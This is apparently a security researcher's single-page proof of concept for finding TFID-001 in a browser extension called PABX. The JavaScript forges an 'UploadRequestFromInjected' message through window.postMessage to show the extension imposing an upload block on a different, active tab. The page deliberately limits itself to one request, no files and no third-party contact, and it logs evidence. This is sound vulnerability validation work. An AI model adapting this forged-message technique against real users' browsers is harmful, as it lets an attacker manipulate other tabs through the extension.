<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PABX TFID-001 Owned-Lab Cross-Tab PoC</title>
<style>
  :root{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color-scheme:light dark}
  body{max-width:920px;margin:32px auto;padding:0 18px;line-height:1.45}
  .card{border:1px solid #888;border-radius:12px;padding:16px;margin:14px 0}
  button,input{font:inherit;padding:9px 11px;border-radius:7px}
  button{cursor:pointer}
  code{background:#8882;padding:1px 4px;border-radius:4px}
  pre{white-space:pre-wrap;word-break:break-word;border:1px solid #888;border-radius:8px;padding:12px;max-height:46vh;overflow:auto}
  .warn{font-weight:700}
  .big{font-size:1.35rem}
  .target{display:grid;place-items:center;min-height:55vh;text-align:center}
  #count{font-size:3rem;font-weight:800}
</style>
</head>
<body>
<script>
(() => {
  "use strict";

  const CHANNEL = "pabx-tfid001-owned-lab";
  const bc = ("BroadcastChannel" in window) ? new BroadcastChannel(CHANNEL) : null;
  const isTarget = new URLSearchParams(location.search).get("target") === "1";

  if (isTarget) {
    document.body.innerHTML = `
      <div class="target">
        <div>
          <h1>Controlled Tab B</h1>
          <p class="big">PABX TFID-001 owned-lab target</p>
          <p>This page does not send any PABX message.</p>
          <p>Leave this tab active and watch for a genuine PABX <code>FileUploadBlocked</code> overlay.</p>
          <pre id="targetLog">Target initialized.</pre>
        </div>
      </div>`;

    const log = document.getElementById("targetLog");
    const events = [];
    function record(type, extra={}) {
      const e = {time:new Date().toISOString(), type, visibilityState:document.visibilityState, hasFocus:document.hasFocus(), ...extra};
      events.push(e);
      log.textContent = JSON.stringify(events, null, 2);
      try { bc?.postMessage({from:"target", ...e}); } catch {}
    }
    record("target-ready");
    addEventListener("focus", () => record("target-focus"));
    addEventListener("blur", () => record("target-blur"));
    document.addEventListener("visibilitychange", () => record("target-visibilitychange"));
    bc?.addEventListener("message", ev => {
      if (ev.data?.from === "caller" && ev.data?.type === "armed") {
        record("caller-armed-received", {fireAt:ev.data.fireAt});
      }
    });
    return;
  }

  document.body.innerHTML = `
    <h1>PABX TFID-001 — Owned-Lab Cross-Tab PoC</h1>

    <div class="card">
      <p><strong>Scope:</strong> one-shot validation of the statically confirmed upload active-tab confused-deputy chain.</p>
      <p>This PoC does <strong>not</strong> enumerate tabs, use a tab ID, invoke CDP/debugger, upload a file, use scanning rules, navigate another tab, or contact a third-party service.</p>
      <p>It sends exactly one page-authored <code>UploadRequestFromInjected</code> with an empty file list and a minimal blocking-shaped test rule. PABX is expected to choose the active tab itself.</p>
    </div>

    <div class="card">
      <h2>1. Open controlled target</h2>
      <button id="openTarget">Open Tab B</button>
      <p>After Tab B opens, come back here to arm the test.</p>
    </div>

    <div class="card">
      <h2>2. Arm exactly one request</h2>
      <label>Type <code>OWNED-LAB</code>:
        <input id="confirm" autocomplete="off" spellcheck="false">
      </label>
      <br><br>
      <label>Delay before request:
        <input id="delay" type="number" min="3" max="20" value="7" style="width:70px"> seconds
      </label>
      <br><br>
      <button id="arm">Arm one test</button>
      <p><strong>Status:</strong> <span id="status">not armed</span></p>
      <div id="count"></div>
      <p class="warn">After clicking Arm, immediately switch to controlled Tab B and leave it active.</p>
    </div>

    <div class="card">
      <h2>3. Evidence log</h2>
      <button id="download">Download evidence JSON</button>
      <pre id="log">No events yet.</pre>
    </div>`;

  const $ = id => document.getElementById(id);
  const events = [];
  let used = false;

  function sanitizedMessage(m) {
    if (!m || typeof m !== "object") return m;
    const out = {};
    for (const [k,v] of Object.entries(m)) {
      if (k === "files") out[k] = Array.isArray(v) ? `[array:${v.length}]` : typeof v;
      else if (k.toLowerCase().includes("rule")) {
        if (v && typeof v === "object") out[k] = {
          ruleId: v.ruleId ?? null,
          effect: v.directive?.properties?.effect ?? null,
          hasDirective: !!v.directive
        };
        else out[k] = v;
      } else if (["type","shouldBlockUpload","error","ok","result"].includes(k)) {
        out[k] = v;
      }
    }
    return out;
  }

  function record(type, extra={}) {
    const e = {
      time:new Date().toISOString(),
      type,
      callerVisibility:document.visibilityState,
      callerHasFocus:document.hasFocus(),
      ...extra
    };
    events.push(e);
    $("log").textContent = JSON.stringify(events, null, 2);
  }

  $("openTarget").onclick = () => {
    const u = new URL(location.href);
    u.searchParams.set("target","1");
    window.open(u.href, "_blank", "noopener");
    record("target-open-requested", {targetUrl:u.href});
  };

  bc?.addEventListener("message", ev => {
    if (ev.data?.from === "target") {
      record("target-signal", {
        targetEvent:ev.data.type,
        targetVisibilityState:ev.data.visibilityState,
        targetHasFocus:ev.data.hasFocus,
        targetTime:ev.data.time
      });
    }
  });

  addEventListener("message", ev => {
    if (ev.source !== window || ev.origin !== location.origin) return;
    const d = ev.data;
    if (!d || typeof d !== "object") return;
    const interesting =
      typeof d.shouldBlockUpload === "boolean" ||
      String(d.type || "").toLowerCase().includes("upload");
    if (!interesting) return;

    record("page-visible-upload-message", {
      message:sanitizedMessage(d)
    });
  }, true);

  function fireRequest() {
    const message = {
      type: "UploadRequestFromInjected",
      files: [],
      activeScanningRule: null,
      monitorScanningRule: null,
      activeUploadRule: {
        ruleId: "pabx-owned-lab-tfid001",
        directive: {
          properties: {
            effect: "Block"
          }
        }
      },
      monitorUploadRule: null
    };

    record("upload-request-sent", {
      noTabIdSupplied: !("tabId" in message),
      filesCount: 0,
      scanningRulesSupplied: false,
      activeUploadRule: sanitizedMessage({activeUploadRule:message.activeUploadRule}).activeUploadRule,
      requestType: message.type
    });

    window.postMessage(message, location.origin);
    $("status").textContent = "request sent — inspect controlled Tab B";
    $("count").textContent = "";
  }

  $("arm").onclick = () => {
    if (used) {
      $("status").textContent = "already used — reload this page for another run";
      return;
    }
    if ($("confirm").value !== "OWNED-LAB") {
      $("status").textContent = "type OWNED-LAB first";
      return;
    }

    let seconds = Number($("delay").value);
    if (!Number.isFinite(seconds)) seconds = 7;
    seconds = Math.max(3, Math.min(20, Math.round(seconds)));

    used = true;
    $("arm").disabled = true;
    $("confirm").disabled = true;
    $("delay").disabled = true;

    const fireAt = Date.now() + seconds * 1000;
    record("armed-one-shot", {
      delaySeconds:seconds,
      fireAt:new Date(fireAt).toISOString(),
      constraints:{
        tabEnumeration:false,
        tabIdSupplied:false,
        realFiles:false,
        scanningRules:false,
        cdpDebugger:false,
        tenantForgery:false,
        maxRequests:1
      }
    });
    try { bc?.postMessage({from:"caller",type:"armed",fireAt:new Date(fireAt).toISOString()}); } catch {}

    $("status").textContent = "ARMED — switch to controlled Tab B now";

    let remaining = seconds;
    $("count").textContent = remaining;
    const interval = setInterval(() => {
      remaining -= 1;
      $("count").textContent = remaining > 0 ? remaining : "";
      if (remaining <= 0) clearInterval(interval);
    }, 1000);

    setTimeout(fireRequest, seconds * 1000);
  };

  $("download").onclick = () => {
    const out = {
      exportedAt:new Date().toISOString(),
      title:"PABX TFID-001 owned-lab cross-tab PoC evidence",
      callerOrigin:location.origin,
      constraints:{
        oneShot:true,
        tabEnumeration:false,
        tabIdSupplied:false,
        realFiles:false,
        scanningRules:false,
        cdpDebugger:false,
        thirdPartyTargets:false
      },
      events
    };
    const blob = new Blob([JSON.stringify(out,null,2)], {type:"application/json"});
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "pabx_tfid001_owned_lab_evidence.json";
    a.click();
    setTimeout(() => URL.revokeObjectURL(a.href), 1000);
  };

  record("caller-ready", {
    origin:location.origin,
    note:"Run only in a researcher-controlled PABX trial/demo profile."
  });
})();
</script>
</body>
</html>
